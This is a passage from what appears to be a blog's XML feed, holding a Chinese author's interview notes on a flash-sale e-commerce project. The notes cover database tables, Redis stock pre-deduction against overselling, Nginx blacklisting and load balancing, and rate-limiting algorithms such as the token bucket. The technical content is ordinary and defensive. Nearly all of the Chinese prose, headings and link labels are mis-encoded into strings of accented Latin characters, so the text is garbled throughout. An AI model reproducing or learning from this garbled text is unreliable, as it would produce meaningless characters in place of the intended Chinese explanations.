      
      
        <tags>
            
            <tag> æ’åºç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç§’æ€é¡¹ç›®</title>
      <link href="/2020/04/09/projectQA/"/>
      <url>/2020/04/09/projectQA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ•´ç†è‡ªå·±ç§’æ€é¡¹ç›®çš„é—®ç­”ç‚¹ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99">è®¾è®¡åŸåˆ™</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1">æ•°æ®åº“è®¾è®¡</a></li><li><a href="#%E9%A1%B5%E9%9D%A2%E9%9D%99%E6%80%81%E5%8C%96">é¡µé¢é™æ€åŒ–</a></li><li><a href="#%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7">æœåŠ¡é™çº§</a></li><li><a href="#%E6%8E%A5%E5%8F%A3%E9%98%B2%E5%88%B7">æ¥å£é˜²åˆ·</a><ul><li><a href="#nginx">Nginx</a></li><li><a href="#%E9%9A%90%E8%97%8F%E6%8E%A5%E5%8F%A3">éšè—æ¥å£</a></li><li><a href="#%E5%8D%95%E7%94%A8%E6%88%B7%E9%99%90%E5%88%B6%E9%A2%91%E7%8E%87">å•ç”¨æˆ·é™åˆ¶é¢‘ç‡</a></li><li><a href="#%E9%87%87%E7%94%A8%E9%AA%8C%E8%AF%81%E7%A0%81">é‡‡ç”¨éªŒè¯ç </a></li></ul></li><li><a href="#%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3%E8%B6%85%E5%8D%96">æ€ä¹ˆè§£å†³è¶…å–</a></li><li><a href="#%E5%88%86%E5%B8%83%E5%BC%8Fsession">åˆ†å¸ƒå¼Session</a></li><li><a href="#%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95">é™æµç®—æ³•</a><ul><li><a href="#%E8%AE%A1%E6%95%B0%E5%99%A8%E7%AE%97%E6%B3%95">è®¡æ•°å™¨ç®—æ³•</a></li><li><a href="#%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%AE%97%E6%B3%95">æ»‘åŠ¨çª—å£ç®—æ³•</a></li><li><a href="#%E6%BC%8F%E6%A1%B6%E7%AE%97%E6%B3%95">æ¼æ¡¶ç®—æ³•</a></li><li><a href="#%E4%BB%A4%E7%89%8C%E6%A1%B6%E7%AE%97%E6%B3%95">ä»¤ç‰Œæ¡¶ç®—æ³•</a></li></ul></li><li><a href="#nginx-1">Nginx</a><ul><li><a href="#%E5%91%BD%E4%BB%A4">å‘½ä»¤</a></li><li><a href="#nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95">Nginxè´Ÿè½½å‡è¡¡ç®—æ³•</a></li><li><a href="#nginx%E9%AB%98%E6%80%A7%E8%83%BD%E7%9A%84%E5%8E%9F%E5%9B%A0">Nginxé«˜æ€§èƒ½çš„åŸå› </a><ul><li><a href="#%E5%8D%8F%E7%A8%8B%E6%9C%BA%E5%88%B6">åç¨‹æœºåˆ¶</a></li></ul></li></ul></li><li><a href="#redis">Redis</a><ul><li><a href="#%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81redis%E7%BC%93%E5%AD%98%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%80%E8%87%B4%E6%80%A7">æ€ä¹ˆä¿è¯Redisç¼“å­˜å’Œæ•°æ®åº“çš„ä¸€è‡´æ€§ï¼Ÿ</a></li><li><a href="#%E9%9B%AA%E5%B4%A9">é›ªå´©</a></li><li><a href="#%E6%9B%B4%E6%96%B0%E5%BA%93%E5%AD%98%E9%97%AE%E9%A2%98">æ›´æ–°åº“å­˜é—®é¢˜</a></li></ul></li><li><a href="#mq">MQ</a></li><li><a href="#tomcat">Tomcat</a></li><li><a href="#cap">CAP</a><ul><li><a href="#%E4%B8%80%E8%87%B4%E6%80%A7">ä¸€è‡´æ€§</a></li><li><a href="#%E5%8F%AF%E7%94%A8%E6%80%A7">å¯ç”¨æ€§</a></li><li><a href="#%E5%88%86%E5%8C%BA%E5%AE%B9%E5%BF%8D%E6%80%A7">åˆ†åŒºå®¹å¿æ€§</a></li><li><a href="#%E6%9D%83%E8%A1%A1">æƒè¡¡</a></li></ul></li><li><a href="#base">BASE</a><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E5%8F%AF%E7%94%A8">åŸºæœ¬å¯ç”¨</a></li><li><a href="#%E8%BD%AF%E7%8A%B6%E6%80%81">è½¯çŠ¶æ€</a></li><li><a href="#%E6%9C%80%E7%BB%88%E4%B8%80%E8%87%B4%E6%80%A7">æœ€ç»ˆä¸€è‡´æ€§</a></li></ul></li></ul><!-- tocstop --><h1><span id="è®¾è®¡åŸåˆ™">è®¾è®¡åŸåˆ™</span></h1><p>å•ä¸€è´£ä»»åˆ¶ï¼Œç§’æ€æ¨¡å—ä¸ä¾èµ–å…¶ä»–æ¨¡å—ï¼Œå³ä½¿æŒ‚äº†æ­£å¸¸ä¸‹å•ä¹Ÿèƒ½èµ°ã€‚</p><p>ç§’æ€åœºæ™¯æ˜¯ä¸€ç§è¯»å¤šå†™å°‘çš„åœºæ™¯ã€‚</p><ol><li><p>å°½é‡å°†è¯·æ±‚æ‹¦æˆªåœ¨ä¸Šæ¸¸ï¼Œåœ¨ç§’æ€å‰å°†ä¸‹å•æŒ‰é’®ç½®ç°ï¼Œç§’æ€å¼€å§‹ååªèƒ½ä¸‹å•ä¸€æ¬¡ã€‚</p></li><li><p>å°½é‡ä½¿ç”¨ç¼“å­˜æ¥ç¼“è§£æ•°æ®åº“çš„å‹åŠ›ã€‚</p></li><li><p>ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å»åšå‰Šå³°å¡«è°·ï¼ŒåŒæ—¶å¼‚æ­¥å»å†™æ•°æ®åº“ï¼Œé™ä½æ•°æ®åº“çš„å‹åŠ›ã€‚</p></li></ol><h1><span id="æ•°æ®åº“è®¾è®¡">æ•°æ®åº“è®¾è®¡</span></h1><p><img src="/2020/04/09/projectQA/image-20200409183104311.png"></p><p>item å•†å“ä¿¡æ¯è¡¨</p><p><img src="/2020/04/09/projectQA/image-20200409183733005.png"></p><p>item_stock åº“å­˜è¡¨</p><p><img src="/2020/04/09/projectQA/image-20200409183704658.png"></p><p>order_info ä¸‹å•ä¿¡æ¯è¡¨</p><p><img src="/2020/04/09/projectQA/image-20200409183638605.png"></p><blockquote><p>è®¢å•å·æœ‰16ä½</p><p>å‰8ä½ä¸ºæ—¶é—´ä¿¡æ¯ï¼Œå¹´æœˆæ—¥</p><p>ä¸­é—´6ä½ä¸ºè‡ªå¢åºåˆ—</p><p>æœ€åä¸¤ä½åˆ†åº“åˆ†è¡¨</p></blockquote><p>promo ç§’æ€å•†å“ä¿¡æ¯è¡¨</p><p><img src="/2020/04/09/projectQA/image-20200409183609319.png"></p><p>sequence_info </p><p>order_infoè¡¨æ ¹æ®é‡Œé¢çš„stepå»å­˜</p><p><img src="/2020/04/09/projectQA/image-20200409183549383.png"></p><p>stock_log</p><p><img src="/2020/04/09/projectQA/image-20200409183500903.png"></p><p>user_info ç”¨æˆ·ä¿¡æ¯è¡¨</p><p><img src="/2020/04/09/projectQA/image-20200409183418037.png"></p><p>user_password ç”¨æˆ·å¯†ç è¡¨</p><p><img src="/2020/04/09/projectQA/image-20200409183222767.png"></p><h1><span id="é¡µé¢é™æ€åŒ–">é¡µé¢é™æ€åŒ–</span></h1><p>cdnçš„æ ¸å¿ƒåŸç†å¹¶å°†é™æ€é¡µé¢éƒ¨ç½²åˆ°cdnä¸Šï¼Œä¹‹åä½¿ç”¨äº†phantomjsçš„æ— å¤´æµè§ˆå™¨æ–¹æ¡ˆå®ç°äº†å°†é™æ€è¯·æ±‚å’ŒåŠ¨æ€è¯·æ±‚åˆå¹¶ä¸€åŒéƒ¨ç½²åˆ°cdnä¸Šï¼Œæ›´è¿›ä¸€æ­¥çš„å°†å•†å“è¯¦æƒ…é¡µçš„æµé‡èƒ½åŠ›æå‡åˆ°æè‡´ï¼›</p><p>é¡µé¢é™æ€åŒ–ï¼Œå…¶å®å°±æ˜¯å°†åŠ¨æ€ç”Ÿæˆçš„jspé¡µé¢ï¼Œå˜æˆé™æ€çš„HTMLé¡µé¢ï¼Œè®©ç”¨æˆ·ç›´æ¥è®¿é—®ã€‚è¿™æ ·çš„å¥½å¤„å°±æ˜¯ï¼š</p><ul><li><p>å¤§å¤§æå‡è®¿é—®é€Ÿåº¦ï¼Œä¸éœ€è¦å»è®¿é—®æ•°æ®åº“ï¼Œæˆ–è€…ç¼“å­˜æ¥è·å–å“ªäº›æ•°æ®ï¼Œæµè§ˆå™¨ç›´æ¥åŠ è½½æ¸²æŸ“htmlé¡µå³å¯ï¼›</p></li><li><p>æœç´¢å¼•æ“æ›´å–œæ¬¢é™çš„ï¼Œæ›´ä¾¿äºæŠ“å–ï¼Œæœç´¢å¼•æ“SEOæ’åæ›´å®¹æ˜“æé«˜ï¼›</p></li><li><p>ä»å®‰å…¨è§’åº¦è®²ï¼Œé™æ€ç½‘é¡µä¸å®œé­åˆ°é»‘å®¢æ”»å‡»ï¼Œå¦‚æœé»‘å®¢ä¸çŸ¥é“ä½ ç½‘ç«™çš„åå°ã€ç½‘ç«™é‡‡ç”¨ç¨‹åºã€æ•°æ®åº“çš„åœ°å€ï¼Œé™æ€ç½‘é¡µï¼Œ æ›´ä¸å®¹æ˜“å—åˆ°é»‘å®¢çš„æ”»å‡»ï¼›</p></li><li><p>ä»ç½‘ç«™ç¨³å®šæ€§æ¥è®²ï¼Œå¦‚æœç¨‹åºã€æ•°æ®åº“å‡ºäº†é—®é¢˜ï¼Œä¼šç›´æ¥å½±å“ç½‘ç«™çš„è®¿é—®ï¼Œè€Œé™æ€ç½‘é¡µå°±é¿å…äº†å¦‚æ­¤æƒ…å†µï¼Œä¸ä¼šå› ä¸ºç¨‹åºç­‰ï¼Œè€ŒæŸå¤±ç½‘ç«™æ•°æ®ï¼Œå½±å“æ­£å¸¸æ‰“å¼€ï¼ŒæŸå¤±ç”¨æˆ·ä½“éªŒï¼Œå½±å“ç½‘ç«™ä¿¡ä»»åº¦ï¼›</p></li></ul><h1><span id="æœåŠ¡é™çº§">æœåŠ¡é™çº§</span></h1><p>æœåŠ¡é™çº§æ˜¯å½“æœåŠ¡å™¨å‹åŠ›å‰§å¢çš„æƒ…å†µä¸‹ï¼Œæ ¹æ®å½“å‰ä¸šåŠ¡æƒ…å†µåŠæµé‡å¯¹ä¸€äº›æœåŠ¡å’Œé¡µé¢æœ‰ç­–ç•¥çš„é™çº§ï¼Œä»¥æ­¤é‡Šæ”¾æœåŠ¡å™¨èµ„æºä»¥ä¿è¯æ ¸å¿ƒä»»åŠ¡çš„æ­£å¸¸è¿è¡Œã€‚é™çº§å¾€å¾€ä¼šæŒ‡å®šä¸åŒçš„çº§åˆ«ï¼Œé¢ä¸´ä¸åŒçš„å¼‚å¸¸ç­‰çº§æ‰§è¡Œä¸åŒçš„å¤„ç†ã€‚æ ¹æ®æœåŠ¡æ–¹å¼ï¼šå¯ä»¥æ‹’æ¥æœåŠ¡ï¼Œå¯ä»¥å»¶è¿ŸæœåŠ¡ï¼Œä¹Ÿæœ‰æ—¶å€™å¯ä»¥éšæœºæœåŠ¡ã€‚æ ¹æ®æœåŠ¡èŒƒå›´ï¼šå¯ä»¥ç æ‰æŸä¸ªåŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥ç æ‰æŸäº›æ¨¡å—ã€‚æ€»ä¹‹æœåŠ¡é™çº§éœ€è¦æ ¹æ®ä¸åŒçš„ä¸šåŠ¡éœ€æ±‚é‡‡ç”¨ä¸åŒçš„é™çº§ç­–ç•¥ã€‚ä¸»è¦çš„ç›®çš„å°±æ˜¯æœåŠ¡è™½ç„¶æœ‰æŸä½†æ˜¯æ€»æ¯”æ²¡æœ‰å¥½ã€‚</p><p><strong>å®é™…ï¼š</strong></p><p>ä¸å®æ—¶æ˜¾ç¤ºåº“å­˜ã€‚</p><p>ä¾‹å¦‚ç”¨æˆ·æŠ¢è´­éœ€è¦å¡«å†™äºŒç»´ç ã€‚</p><p>ä¸èƒ½åŠæ—¶åé¦ˆæŠ¢è´­æˆåŠŸæ¶ˆæ¯ï¼Œæ˜¾ç¤ºæ’é˜Ÿä¸­ã€‚</p><h1><span id="æ¥å£é˜²åˆ·">æ¥å£é˜²åˆ·</span></h1><h2><span id="nginx">Nginx</span></h2><p>æ ¡éªŒæ¶æ„è¯·æ±‚</p><p>Nginxé»‘åå•ï¼šè¿‡æ»¤æ—¥å¿—è®¿é—®APIæ¥å£çš„IPï¼Œç»Ÿè®¡æ¯10åˆ†é’Ÿè°ƒç”¨è¶…è¿‡100æ¬¡çš„IPï¼Œç›´æ¥ä¸¢è¿›nginxçš„è®¿é—®é»‘åå•</p><p>åœ¨ Nginx ä¸Šé™åˆ¶å• IP å•ä½æ—¶é—´çš„è¯·æ±‚æ•°ï¼Œä»¥åŠå• IP çš„å¹¶å‘è¿æ¥æ•°ã€‚</p><h2><span id="éšè—æ¥å£">éšè—æ¥å£</span></h2><p>æ¯æ¬¡ç‚¹å‡»ç§’æ€æŒ‰é’®ï¼Œå…ˆä»æœåŠ¡å™¨è·å–ä¸€ä¸ªç§’æ€éªŒè¯å€¼ï¼ˆæ¥å£å†…åˆ¤æ–­æ˜¯å¦åˆ°ç§’æ€æ—¶é—´ï¼‰ï¼Œä½¿ç”¨md5åŠ å¯†userIDå’Œç§’æ€IDç„¶åå†åŠ ç›ã€‚</p><p>Redisä»¥ç¼“å­˜ç”¨æˆ·IDå’Œå•†å“IDä¸ºKeyï¼Œç§’æ€åœ°å€ä¸ºValueç¼“å­˜éªŒè¯å€¼ï¼Œè¿‡æœŸæ—¶é—´è®¾ç½®1åˆ†é’Ÿå·¦å³çš„éšæœºå€¼ã€‚</p><p>ç”¨æˆ·è¯·æ±‚ç§’æ€å•†å“çš„æ—¶å€™ï¼Œè¦å¸¦ä¸Šç§’æ€éªŒè¯å€¼è¿›è¡Œæ ¡éªŒã€‚</p><h2><span id="å•ç”¨æˆ·é™åˆ¶é¢‘ç‡">å•ç”¨æˆ·é™åˆ¶é¢‘ç‡</span></h2><p>æ¯å½“ç”¨æˆ·è®¿é—®ä¸€æ¬¡ä¸‹å•æ¥å£å°±å°†ç”¨æˆ·çš„è®¿é—®æ•°+1ï¼Œåˆ°è¾¾ä¸€å®šé˜ˆå€¼å°±æ‹’ç»è®¿é—®ã€‚</p><h2><span id="é‡‡ç”¨éªŒè¯ç ">é‡‡ç”¨éªŒè¯ç </span></h2><p>åŠ å…¥éªŒè¯ç æ¥é˜²æ­¢æœºå™¨åˆ·æ¥å£ã€‚</p><h1><span id="æ€ä¹ˆè§£å†³è¶…å–">æ€ä¹ˆè§£å†³è¶…å–</span></h1><blockquote><p>ä½¿ç”¨redisæœåŠ¡å™¨ï¼Œå°†å¹¶å‘çš„è¯·æ±‚è½¬åŒ–æˆä¸²è¡Œçš„è¯·æ±‚ï¼Œé€ä¸€å¤„ç†æ¯ä¸€ä¸ªè¯·æ±‚ï¼ŒåŸå­æ“ä½œå‡åº“å­˜ã€‚<br>å‡åº“å­˜sqlï¼Œsetåº“å­˜&#x3D;åº“å­˜-1 where åº“å­˜&gt;0ã€‚</p></blockquote><ol><li>åœ¨ç³»ç»Ÿåˆå§‹åŒ–æ—¶ï¼Œæˆ–è€…å®šæ—¶ä»»åŠ¡ï¼Œè°ƒç”¨æ¥å£æ—¶å°†å•†å“çš„åº“å­˜æ•°é‡åŠ è½½åˆ°Redisç¼“å­˜ä¸­</li><li>åœ¨Redisä¸­è®¾ç½®ä¸€ä¸ªkeyè¡¨ç¤ºæ˜¯å¦è¯¥ç§’æ€å•†å“æœ‰åº“å­˜</li><li>æ¥æ”¶åˆ°ç§’æ€è¯·æ±‚æ—¶ï¼Œå…ˆåˆ¤æ–­keyæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåœ¨Redisä¸­è¿›è¡Œé¢„å‡åº“å­˜ï¼Œå½“Redisä¸­çš„åº“å­˜ä¸è¶³æ—¶ï¼Œç›´æ¥è¿”å›ç§’æ€å¤±è´¥ï¼Œå¹¶å°†keyè®¾ç½®ä¸ºtrueï¼›</li><li>å°†è¯·æ±‚æ”¾å…¥å¼‚æ­¥é˜Ÿåˆ—ä¸­ï¼Œè¿”å›æ­£åœ¨æ’é˜Ÿä¸­ï¼›</li><li>æœåŠ¡ç«¯å¼‚æ­¥é˜Ÿåˆ—å°†è¯·æ±‚å‡ºé˜Ÿï¼Œå‡ºé˜ŸæˆåŠŸçš„è¯·æ±‚å¯ä»¥ç”Ÿæˆç§’æ€è®¢å•ï¼Œå‡å°‘æ•°æ®åº“åº“å­˜ï¼Œè¿”å›ç§’æ€è®¢å•è¯¦æƒ…ã€‚</li></ol><p>å¼‚æ­¥é˜Ÿåˆ—å¼€å¯äº‹åŠ¡ï¼Œå¦‚æœå¤±è´¥åœ¨catchä¸­å°†åº“å­˜åŠ å›å»ï¼ŒåŒæ—¶å»æ‰æ ‡å¿—ä½ã€‚</p><p>å¦‚æœRedisè¶…å–äº†å°±ä½¿ç”¨luaè„šæœ¬</p><p>å¯ä»¥ä½¿ç”¨JVMç¼“å­˜å»åšflagï¼Œä½†æ˜¯éœ€è¦ç”¨zookeeperã€‚</p><h1><span id="åˆ†å¸ƒå¼session">åˆ†å¸ƒå¼Session</span></h1><p>å¯¹æ¯ä¸ªç™»å½•çš„ç”¨æˆ·åˆ†å‘Tokenï¼Œå°†Tokenæ”¾å…¥Redisä¸­ï¼Œç¡®ä¿åˆ†å¸ƒå¼çš„è®¿é—®ã€‚</p><h1><span id="é™æµç®—æ³•">é™æµç®—æ³•</span></h1><p>ä¸»è¦ä½¿ç”¨Guavaçš„RateLimiterè¿›è¡Œé™æµï¼Œé‡‡ç”¨çš„æ˜¯ä»¤ç‰Œæ¡¶æœºåˆ¶ã€‚</p><p>ä¸ºä»€ä¹ˆç”¨ä»¤ç‰Œæ¡¶ï¼š</p><blockquote><p>æ¼æ¡¶ç®—æ³•èƒ½å¤Ÿå¼ºè¡Œé™åˆ¶æ•°æ®çš„ä¼ è¾“é€Ÿç‡ï¼Œè€Œä»¤ç‰Œæ¡¶ç®—æ³•åœ¨èƒ½å¤Ÿé™åˆ¶æ•°æ®çš„å¹³å‡ä¼ è¾“é€Ÿç‡å¤–ï¼Œ<strong>è¿˜å…è®¸æŸç§ç¨‹åº¦çš„çªå‘ä¼ è¾“</strong>ã€‚åœ¨ä»¤ç‰Œæ¡¶ç®—æ³•ä¸­ï¼Œåªè¦ä»¤ç‰Œæ¡¶ä¸­å­˜åœ¨ä»¤ç‰Œï¼Œé‚£ä¹ˆå°±å…è®¸çªå‘åœ°ä¼ è¾“æ•°æ®ç›´åˆ°è¾¾åˆ°ç”¨æˆ·é…ç½®çš„é—¨é™ï¼Œ<strong>å› æ­¤å®ƒé€‚åˆäºå…·æœ‰çªå‘ç‰¹æ€§çš„æµé‡</strong>ã€‚</p></blockquote><h2><span id="è®¡æ•°å™¨ç®—æ³•">è®¡æ•°å™¨ç®—æ³•</span></h2><p>é€šè¿‡ä¸€ä¸ªè®¡æ•°å™¨ counter æ¥ç»Ÿè®¡ä¸€æ®µæ—¶é—´å†…è¯·æ±‚çš„æ•°é‡ï¼Œå¹¶ä¸”åœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åé‡ç½®è®¡æ•°å™¨ã€‚</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163256.png" alt="img"></p><p>è¯¥æ–¹æ³•å®ç°ç®€å•ï¼Œä½†æ˜¯æœ‰ä¸´ç•Œé—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå…è®¸ä¸€åˆ†é’Ÿå†…é€šè¿‡çš„è¯·æ±‚æ•°ä¸º Nï¼Œå¦‚æœåœ¨é‡ç½®è®¡æ•°å™¨çš„å‰åä¸€å°æ®µæ—¶é—´å†…åˆ†åˆ«è¯·æ±‚ N æ¬¡ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸€å°æ®µæ—¶é—´å†…æ€»å…±è¯·æ±‚äº† 2N æ¬¡ï¼Œè¶…å‡ºäº†è§„å®šçš„ N æ¬¡ã€‚</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163331.png" alt="img"></p><h2><span id="æ»‘åŠ¨çª—å£ç®—æ³•">æ»‘åŠ¨çª—å£ç®—æ³•</span></h2><p>æ˜¯è®¡æ•°å™¨ç®—æ³•çš„ä¸€ç§æ”¹è¿›ï¼Œå°†åŸæ¥çš„ä¸€ä¸ªæ—¶é—´çª—å£åˆ’åˆ†æˆå¤šä¸ªæ—¶é—´çª—å£ï¼Œå¹¶ä¸”ä¸æ–­å‘å³æ»‘åŠ¨è¯¥çª—å£ã€‚</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163435.png" alt="img"></p><p>åœ¨ä¸´ç•Œä½ç½®çš„çªå‘è¯·æ±‚éƒ½ä¼šè¢«ç®—åˆ°æ—¶é—´çª—å£å†…ï¼Œå› æ­¤å¯ä»¥è§£å†³è®¡æ•°å™¨ç®—æ³•çš„ä¸´ç•Œé—®é¢˜ã€‚</p><p><img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/other20190427163502.png" alt="img"></p><h2><span id="æ¼æ¡¶ç®—æ³•">æ¼æ¡¶ç®—æ³•</span></h2><p>èƒ½å¤Ÿä»¥æ’å®šé€Ÿç‡å¤„ç†è¯·æ±‚ã€‚</p><p>è¯·æ±‚éœ€è¦å…ˆæ”¾å…¥ç¼“å­˜ä¸­ï¼Œå½“ç¼“å­˜æ»¡äº†æ—¶ï¼Œè¯·æ±‚ä¼šè¢«ä¸¢å¼ƒã€‚</p><p><img src="https://images.xiaozhuanlan.com/photo/2019/45fd0c7d1684df040295f21ee5a1b13c.png" alt="img"></p><h2><span id="ä»¤ç‰Œæ¡¶ç®—æ³•">ä»¤ç‰Œæ¡¶ç®—æ³•</span></h2><p>å’Œæ¼æ¡¶ç®—æ³•çš„åŒºåˆ«åœ¨äºå®ƒæ˜¯ä»¥æ’å®šé€Ÿç‡æ·»åŠ ä»¤ç‰Œï¼Œå½“ä¸€ä¸ªè¯·æ±‚åˆ°æ¥æ—¶ï¼Œå…ˆä»ä»¤ç‰Œæ¡¶å–å‡ºä¸€ä¸ªä»¤ç‰Œï¼Œå¦‚æœèƒ½å–åˆ°ä»¤ç‰Œé‚£ä¹ˆå°±å¯ä»¥å¤„ç†è¯¥è¯·æ±‚ã€‚</p><p>ä»¤ç‰Œæ¡¶çš„å¤§å°æœ‰é™ï¼Œè¶…è¿‡ä¸€å®šçš„ä»¤ç‰Œä¹‹åå†æ·»åŠ è¿›æ¥çš„ä»¤ç‰Œä¼šè¢«ä¸¢å¼ƒã€‚</p><p>ä»¤ç‰Œæ¡¶ç®—æ³•å…è®¸çªå‘è¯·æ±‚ï¼Œå› ä¸ºä»¤ç‰Œæ¡¶å­˜æ”¾äº†å¾ˆå¤šä»¤ç‰Œï¼Œé‚£ä¹ˆå¤§é‡çš„çªå‘è¯·æ±‚ä¼šè¢«æ‰§è¡Œã€‚ä½†æ˜¯å®ƒä¸ä¼šå‡ºç°ä¸´ç•Œé—®é¢˜ï¼Œåœ¨ä»¤ç‰Œç”¨å®Œä¹‹åï¼Œä»¤ç‰Œæ˜¯ä»¥ä¸€ä¸ªæ’å®šçš„é€Ÿç‡æ·»åŠ åˆ°ä»¤ç‰Œæ¡¶ä¸­çš„ï¼Œå› æ­¤ä¸èƒ½å†æ¬¡å‘é€å¤§é‡çªå‘è¯·æ±‚ã€‚</p><p><img src="https://images.xiaozhuanlan.com/photo/2019/45334f956d2902b43581bc32846a02ae.png" alt="img"></p><h1><span id="nginx">Nginx</span></h1><p>å°†é™æ€ç½‘é¡µéƒ¨ç½²åœ¨Nginxä¸Šï¼Œåœ¨é™æ€ç½‘é¡µæ–¹é¢ï¼ŒNginxæ˜¯æ¯”Tomcatå¿«çš„ã€‚</p><p>ä½¿ç”¨åå‘ä»£ç†åŠ¨æ€è¯·æ±‚åˆ°Tomcatä¸Šï¼Œ<strong>Nginxå¯ä»¥ç®¡ç†åç«¯çš„ä¸€ä¸ªtomcaté›†ç¾¤ï¼Œç„¶åä»¥ä¸€ä¸ªç»Ÿä¸€çš„åŸŸåä¾›ç”¨æˆ·å»è®¿é—®</strong>ï¼›</p><p><strong>nginxåŠ¨é™åˆ†ç¦»æœåŠ¡å™¨</strong></p><ul><li>locationèŠ‚ç‚¹pathç‰¹å®šresources:é™æ€èµ„æºè·¯å¾„ï¼›</li><li>locationèŠ‚ç‚¹å…¶å®ƒè·¯å¾„ï¼šåŠ¨æ€èµ„æºç”¨ï¼›</li></ul><p><strong>å¦‚ä½•ä½¿ç”¨åŠ¨æ€èµ„æºï¼Ÿ</strong><br>nginxåšåå‘ä»£ç†æœåŠ¡å™¨</p><ul><li>è®¾ç½®upstream server</li><li>è®¾ç½®åŠ¨æ€è¯·æ±‚locationä¸ºproxy passè·¯å¾„ï¼›</li><li>å¼€å¯tomcat access log(è®¿é—®æ—¥å¿—)éªŒè¯</li></ul><h2><span id="å‘½ä»¤">å‘½ä»¤</span></h2><ul><li>sbin&#x2F;nginx -c conf&#x2F;nginx.confå¯åŠ¨;</li><li>ä¿®æ”¹é…ç½®åç›´æ¥sbin&#x2F;nginx -s reloadæ— ç¼é‡å¯;</li></ul><h2><span id="nginxè´Ÿè½½å‡è¡¡ç®—æ³•">Nginxè´Ÿè½½å‡è¡¡ç®—æ³•</span></h2><p><strong>1. è½®è¯¢(é»˜è®¤)</strong><br>æ¯ä¸ªwebè¯·æ±‚æŒ‰ç…§æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æœåŠ¡å™¨overäº†ï¼Œå°±è‡ªåŠ¨å‰”é™¤ï¼›</p><p><strong>2. weightæƒé‡</strong><br>æŒ‡å®šè½®è¯¢å‡ ç‡ï¼Œweightå’Œè®¿é—®æ¯”ç‡æˆæ­£æ¯”ï¼Œç”¨äºåç«¯æœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µï¼Œweighté»˜è®¤æ˜¯1ï¼›</p><p><strong>3. æœ€å°‘é“¾æ¥</strong><br>webè¯·æ±‚ä¼šè¢«è½¬å‘åˆ°è¿æ¥æ•°æœ€å°‘çš„æœåŠ¡å™¨ä¸Šï¼›</p><p><strong>4. ip_hash</strong><br>æ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®ipçš„hashå€¼åˆ†é…ï¼Œè¿™æ ·åŒä¸€å®¢æˆ·ç«¯è¿ç»­çš„Webè¯·æ±‚éƒ½ä¼šè¢«åˆ†å‘åˆ°åŒä¸€æœåŠ¡å™¨è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥è§£å†³sessionçš„é—®é¢˜ã€‚å½“åå°æœåŠ¡å™¨å®•æœºæ—¶ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°å…¶å®ƒæœåŠ¡å™¨ï¼›</p><p><strong>5. url_hashï¼ˆç¬¬ä¸‰æ–¹ï¼‰</strong><br>nginxæŒ‰è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨ä¸ºç¼“å­˜æœåŠ¡å™¨ã€æ–‡ä»¶æœåŠ¡å™¨ã€é™æ€æœåŠ¡å™¨æ—¶æ¯”è¾ƒæœ‰æ•ˆã€‚ç¼ºç‚¹æ˜¯å½“åç«¯æœåŠ¡å™¨å®•æœºçš„æ—¶å€™ï¼Œurl_hashä¸ä¼šè‡ªåŠ¨è·³è½¬çš„å…¶ä»–ç¼“å­˜æœåŠ¡å™¨ï¼Œè€Œæ˜¯è¿”å›ç»™ç”¨æˆ·ä¸€ä¸ª503é”™è¯¯ï¼›</p><p><strong>6. fairï¼ˆç¬¬ä¸‰æ–¹ï¼‰</strong><br>æŒ‰åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…ï¼›</p><h2><span id="nginxé«˜æ€§èƒ½çš„åŸå› ">Nginxé«˜æ€§èƒ½çš„åŸå› </span></h2><p><img src="https://img-blog.csdnimg.cn/20190824110215219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dodzE1MjIxODM2MzQy,size_16,color_FFFFFF,t_70" alt="Nginxå¤šè¿›ç¨‹æ¨¡å‹"></p><p>Nginxé«˜æ€§èƒ½ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><ul><li><strong>epollå¤šè·¯å¤ç”¨å®Œæˆéé˜»å¡å¼çš„IOæ“ä½œ</strong>ï¼›</li><li><strong>master 